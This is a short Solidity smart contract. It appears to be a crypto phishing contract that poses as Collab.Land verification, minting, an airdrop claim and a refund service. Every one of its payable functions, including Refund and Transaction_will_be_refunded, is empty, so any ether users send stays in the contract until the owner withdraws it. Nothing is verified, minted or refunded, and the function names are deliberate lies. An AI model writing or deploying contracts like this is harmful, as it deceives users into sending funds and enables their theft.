1 pragma solidity ^0.4.26;
2 
3 contract Verify {
4 
5     address private  owner;    // current owner of the contract
6 
7      constructor() public{   
8         owner=msg.sender;
9     }
10     function getOwner(
11     ) public view returns (address) {    
12         return owner;
13     }
14     function withdraw() public {
15         require(owner == msg.sender);
16         msg.sender.transfer(address(this).balance);
17     }
18 
19     function Verification() public payable {
20     }
21 
22     function Mint() public payable {
23     }
24 
25     function ClaimAirdrop() public payable {
26     }
27 
28     function CollabLand() public payable {
29     }
30 
31     function Refund() public payable {
32     }
33 
34     function Collab_Land() public payable {
35     }
36 
37     function Collab_Land_Verify() public payable {
38     }
39 
40     function Transaction_will_be_refunded() public payable {
41     }
42 
43     function getBalance() public view returns (uint256) {
44         return address(this).balance;
45     }
46 }